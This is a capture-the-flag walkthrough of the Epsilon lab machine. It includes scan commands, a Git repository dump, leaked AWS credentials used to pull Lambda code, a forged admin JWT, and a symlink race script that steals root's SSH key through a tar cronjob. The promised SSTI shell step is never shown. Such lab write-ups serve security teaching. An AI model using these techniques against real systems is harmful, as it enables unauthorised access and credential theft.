Overview

Epsilon is a medium-difficulty Linux machine that exposes a Git repository on the web server. During enumeration, AWS Lambda credentials leaked in Git commits are discovered, allowing us to obtain the secret key used to sign JWTs in the Flask application. With this key, we can forge administrator cookies and access protected routes. Finally, root is obtained by abusing a cronjob that runs tar with the -h option, allowing critical files to be replaced via symbolic links.

Key steps

  1. Port scanning and enumeration using nmap.
  2. Web application enumeration and dumping the Git repository.
  3. Reviewing commits to extract AWS Lambda credentials.
  4. Generating a JWT token with the secret key for administrative access.
  5. Exploiting SSTI in the Flask application to obtain a shell.
  6. Privilege escalation using a cronjob with tar and symbolic links.

1. Port enumeration

The first step is identifying which services are exposed on the target machine. We use nmap for a full TCP port scan:

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134

Flag explanation:

  • -p-: Scans all 65535 ports.
  • --open: Shows only open ports.
  • -sT: Full TCP connect scan.
  • --min-rate 5000: Sends at least 5000 packets per second.
  • -vvv: Maximum verbosity.
  • -n: Skips DNS resolution.
  • -Pn: Skips initial ping (useful against firewalls blocking ICMP).

Results:

22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  http

Interpretation: SSH server for remote access, public website on port 80, and another HTTP application on port 5000 (API or internal app).

2. HTTP enumeration and Git repository dump

Visiting http://10.10.10.134 returns a 403. We check if a Git repository is exposed at /.git using gitdumper:

./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo

This allows us to obtain commit history, files, and leaked credentials.

Reviewing commits to find credentials

Inspecting current files did not reveal credentials. We check previous commits:

cd ~/CTF/Epsilon/loot/epsilon-repo
git log --oneline --graph --all
git log -p > ../commits_diff.txt
cat ../commits_diff.txt

3. AWS Lambda enumeration

We configure AWS CLI with the credentials:

aws configure
# aws_access_key_id and aws_secret_access_key
# region: us-east-1

List the Lambda functions:

aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions

Download the function code:

aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
wget http://cloud.epsilon.htb/path/to/code.zip
unzip code.zip
cat lambda_function.py

The secret key used to sign JWTs is found in this file.

4. Exploitation and initial access

Generate an admin JWT using PyJWT:

import jwt
secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
print(token)

Place this token in the auth cookie to access admin routes:

curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home

5. Privilege escalation

Using pspy, we find a backup cronjob that runs tar -h every 5 seconds:

#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

We abuse -h to replace critical files using symbolic links:

#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
        break
    fi; 
done

Explanation: This script loops waiting for checksum to exist. Once created by the cronjob, we remove it and create a symbolic link pointing to /root/.ssh/id_rsa. When the cronjob archives again with -h, the private key is copied to a location we can access, simulating the backup “extraction.”

Example of extracting id_rsa:

cd /tmp
./root.sh
cd /var/backups/web_backups
cp 503891800.tar /tmp
cd /tmp
tar -xf 503891800.tar
cd opt/backups
cat checksum  # Contains the id_rsa

Finally, connect via SSH as root:

ssh -i id_rsa root@10.10.10.134

This grants full access to the Epsilon machine.
